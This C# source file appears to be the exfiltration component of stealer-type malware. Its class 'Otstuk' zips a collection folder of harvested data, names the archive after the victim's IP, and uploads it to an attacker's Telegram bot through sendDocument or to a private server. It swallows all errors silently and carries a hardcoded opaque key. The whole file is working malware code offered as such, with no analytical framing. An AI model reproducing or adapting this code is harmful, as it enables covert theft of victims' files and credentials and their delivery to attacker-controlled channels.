using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Otstuk
    {
      public static async Task Run(OMethod.OMethods method)
      {
        try
        {
          if (method == OMethod.OMethods.TelegramBot)
            await Otstuk.TelegramOtstuk();
          if (method != OMethod.OMethods.MyPrivateServer)
            return;
          await Otstuk.OtstukToServer(Config.myPrivateServer);
        }
        catch
        {
        }
      }

      private static string BuildUrl(OMethod.OMethods method)
      {
        return method == OMethod.OMethods.TelegramBot ? $"{Config.ApiUrl}{Config.token}/sendDocument?chat_id={Config.id}{"&caption=" + SenderAPI.Caption()}&parse_mode=HTML" : (method == OMethod.OMethods.MyPrivateServer ? Config.myPrivateServer : "");
      }

      private static async Task TelegramOtstuk()
      {
        try
        {
          string zipArchiveName = Help.IP + ".zip";
          string exploitDir = Help.ExploitDir;
          string targetDirectory = Help.dir;
          string targetDirectory1 = targetDirectory;
          string zipFileName = zipArchiveName;
          await Otstuk.CreateZipArchive(exploitDir, targetDirectory1, zipFileName);
          string path = Path.Combine(targetDirectory, zipArchiveName);
          string fileName = Path.GetFileName(path);
          byte[] file = File.ReadAllBytes(path);
          string str = "gggf980fd98f98fd980fd890f98f09f08fd980fd909uitu94U098089U4TJ908ERGJ098R089GAR09G90ADRG098AR089GR908GAD90RG";
          string filename = fileName;
          string url = Otstuk.BuildUrl(OMethod.OMethods.TelegramBot);
          string apiKey = str;
          await SenderAPI.TGotstuk(file, filename, "application/x-ms-dos-executable", url, apiKey);
          zipArchiveName = (string) null;
          targetDirectory = (string) null;
        }
        catch
        {
        }
      }

      private static async Task OtstukToServer(string url)
      {
        try
        {
          string zipArchiveName = Help.IP + ".zip";
          string exploitDir = Help.ExploitDir;
          string targetDirectory = Help.dir;
          string targetDirectory1 = targetDirectory;
          string zipFileName = zipArchiveName;
          await Otstuk.CreateZipArchive(exploitDir, targetDirectory1, zipFileName);
          string path = Path.Combine(targetDirectory, zipArchiveName);
          await SenderAPI.MyPrivateServerOtstuk(url, Path.GetFileName(path), File.ReadAllBytes(path));
          zipArchiveName = (string) null;
          targetDirectory = (string) null;
        }
        catch
        {
        }
      }

      public static async Task CreateZipArchive(
        string sourceDirectory,
        string targetDirectory,
        string zipFileName)
      {
        try
        {
          if (!Directory.Exists(sourceDirectory))
          {
            Console.WriteLine("Указанная папка не существует.");
          }
          else
          {
            if (!Directory.Exists(targetDirectory))
              Directory.CreateDirectory(targetDirectory);
            string path = Path.Combine(targetDirectory, zipFileName);
            if (File.Exists(path))
            {
              Console.WriteLine("Файл с таким именем уже существует.");
            }
            else
            {
              using (FileStream fileStream1 = new FileStream(path, FileMode.Create))
              {
                using (ZipArchive zipArchive = new ZipArchive((Stream) fileStream1, ZipArchiveMode.Create, true))
                {
                  foreach (FileInfo file in new DirectoryInfo(sourceDirectory).GetFiles("*.*", SearchOption.AllDirectories))
                  {
                    string entryName = file.FullName.Substring(sourceDirectory.Length + 1);
                    ZipArchiveEntry entry = zipArchive.CreateEntry(entryName, CompressionLevel.Optimal);
                    using (FileStream fileStream2 = new FileStream(file.FullName, FileMode.Open))
                    {
                      using (Stream destination = entry.Open())
                        fileStream2.CopyTo(destination);
                    }
                  }
                }
              }
              Console.WriteLine($"Архив {zipFileName} успешно создан в папке {targetDirectory}");
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine("Ошибка при создании архива: " + ex.Message);
        }
      }
    }
}
